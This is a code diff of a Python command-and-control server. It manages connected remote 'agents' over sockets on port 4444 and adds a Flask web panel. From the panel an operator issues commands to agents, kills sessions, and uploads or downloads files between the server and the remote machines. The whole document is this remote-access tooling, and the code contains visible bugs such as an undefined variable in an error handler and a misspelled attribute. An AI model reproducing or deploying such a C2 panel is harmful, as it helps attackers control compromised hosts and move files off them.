@@ -2,15 +2,16 @@ import socket
 import threading
 import time
 
-# from flask import *
+from flask import *
 import datetime
 
-# dynamically gets system IP.
-# IP = socket.gethostbyname(socket.gethostname())
+
 IP = "127.0.0.1"
 PORT = 4444
 SIZE = 2048
 FORMAT = "utf-8"
+
+app = Flask(__name__)
 
 
 class Server:
@@ -53,7 +54,7 @@ class Connection:
         self.rAddr = rAddr
         self.id = str(id)
         self.frm_client = ""
-        # self.to_send = ""
+        self.to_send = " "
 
     # do our best to kill the socket any way we can if need be.
     def __del__(self):
@@ -75,9 +76,17 @@ class Connection:
 
     def send(self, msg):
         try:
+            self.to_send = msg
             self.socket.send(msg.encode("utf-8"))
         except ConnectionResetError as connReset:
             print(f"client init shutdown, closing.")
+            self.close_socket()
+
+    def send_file(self, file):
+        try:
+            self.socket.send(file)
+        except ConnectionResetError as conReset:
+            print(f"client init shutdown, closing")
             self.close_socket()
 
     def recv(self, size):
@@ -92,42 +101,87 @@ class Connection:
 # this function gets ran by every connection.
 def handle_client(client, server):
     print(f"New client connected: {client.rAddr}")
-    # TODO: include a counter to kill the connection
-    # after N seconds of nothing. (HeartBeat?)
-    #           #           #               #
-    # starts a loop to handle the client's state:
-    # connected = True
     while client.frm_client != "close":
+        # print(client.to_send)
         try:
-            # basic echo server
-            # print(f"received: {client.frm_client}")
-            if client.frm_client == "status":
-                msg = f"{server.threads}\n{server.clients}"
-                # when sending to client, must be inside a variable
-                # does not accept strings
-                # client.send(msg)
-                print(msg)
-                client.frm_client = ""
-            else:
+            if "upload" in client.to_send:
+                # if client.to_send[0:5] == "upload":
+                print("server has seen upload command")
+                filename = client.to_send[6:].strip(" ")
+                print(f"attempting to open file: '{filename}'")
+                # client.send(filename)
+                # try:
+                with open(filename, "r") as f:
+                    bin_file = f.read()
+                    print(f"sending filename: {filename}")
+                    client.send(bin_file)
+                    # client.send_file(bin_file)
+                    f.close()
+                    client.to_send = " "
+                # except:
+                #    print("couldn't send file")
+                #    time.sleep(1)
+                #    client.send("server couldn't send file")
+                #    client.to_send = " "
+            elif "download" in client.to_send:
+                print("server has seen download command")
+                filename = client.to_send[8:].split(" ")[1]
+                filename = f"./{filename}"
+                print(f"attempting to open {filename}")
+                with open(filename, "w") as f:
+                    print(f"{filename} has been opened")
+                    file = client.recv(2048)  # .decode("Utf-8")
+                    print(f"{filename} has been recieved from the client")
+                    f.write(file)
+                    print(f"{filename} has been saved to server disk")
+                    f.close()
+                client.to_send = " "
+            elif client.to_send == "whoami":
                 msg = client.recv(1024)
                 print(f"[{client.rAddr}]: {msg}")
                 msg = f"Msg recieved: {msg}"
                 client.send(msg)
+            elif client.to_send[0] == "!":
+                msg = client.recv(2048)
+                print(f"[{client.rAddr}]: {msg}")
+                msg = f"Msg recieved: {msg}"
+                client.send(msg)
+                client.to_send = " "
+            elif "kill" in client.to_send:
+                client.send(client.to_send)
+                client.close_socket()
+                for t in server.threads:
+                    if client.id in t.name:
+                        server.remove_client(t, client)
+                client.to_send = " "
+            elif client.to_send is None:
+                continue
+            elif client.to_send == " ":
+                continue
+            else:
+                continue
+                # msg = client.recv(1024)
+                # print(f"[{client.rAddr}]: {msg}")
+                # msg = f"Msg recieved: {msg}"
+                # client.send(msg)
                 # client.frm_client = ""
         except ConnectionResetError as connReset:
             print(f"client {c.id} init shutdown, closing")
+            client.frm_client = "closed"
             for c in server.clients:
                 if c.id == threading.current_thread().name:
                     t = server.find_thread(c.id)
                     server.remove_client(t, c)
         except BrokenPipeError as brkPipe:
             print(f"client {client.id} has disconnected")
+            client.frm_client = "close"
             for c in server.clients:
                 if c.id == threading.current_thread().name:
                     t = server.find_thread(c.id)
                     server.remove_client(t, c)
             client.frm_lient = "close"
         except OSError as oserror:
+            client.frm_client = "close"
             print(f"client {client.id} has disconnected")
             for c in server.clients:
                 if c.id == threading.current_thread().name:
@@ -142,10 +196,51 @@ def handle_client(client, server):
     exit()
 
 
-def main():
+# Define routes and build out web pages:
+@app.before_first_request
+def init_server():
+    server_thread = threading.Thread(target=build_server)
+    server_thread.start()
+
+
+@app.route("/index")
+@app.route("/")
+@app.route("/index.html")
+@app.route("/home")
+def home():
+    return render_template("index.html")
+
+
+@app.route("/agents")
+@app.route("/agents.html")
+def agents():
+    return render_template("agents.html", server_object=s)
+
+
+@app.route("/<agentName>/execmd")
+def execmd(agentName):
+    return render_template("execmd.html", agentName=agentName, server_object=s)
+
+
+@app.route("/<agentName>/exec", methods=["POST"])
+def exec(agentName):
+    cmd = request.form["command"]
+    for x in s.clients:
+        if agentName in x.id:
+            # x.to_send = cmd
+            # print(f"adding '{cmd}' to to_send")
+            x.send(cmd)
+            return redirect(f"http://localhost:8080/{agentName}/execmd")
+
+
+# def run_server(server_object):
+
+
+def build_server():
     print("[+] Starting Server")
-    s = Server(IP, PORT)
     id = 1
+    global s
+    s = Server(IP, PORT)
     while True:
         try:
             sock_obj, addr = s.sock.accept()
@@ -161,7 +256,7 @@ def main():
             s.add_client(c)
             s.set_thread(thread)
             id += 1
-            print(f"Active Connections: {threading.active_count() - 1}")
+            print(f"Active Connections: {threading.active_count() - 3}")
 
             # Need to include function to clean stale / closed
             # threads out of acitve_threads
@@ -179,9 +274,11 @@ def main():
             print("!!!THREADS KILLED!!!")
             s.clients.clear()
             print("CLEANUP COMPLETE, GOODBYE..")
-
             exit()
+        except ValueError as vErr:
+            print("[-] ValueError occured, doesn't effect us")
 
 
 if __name__ == "__main__":
-    main()
+    # app.run(port=8080, debug=True)
+    app.run(port=8080)
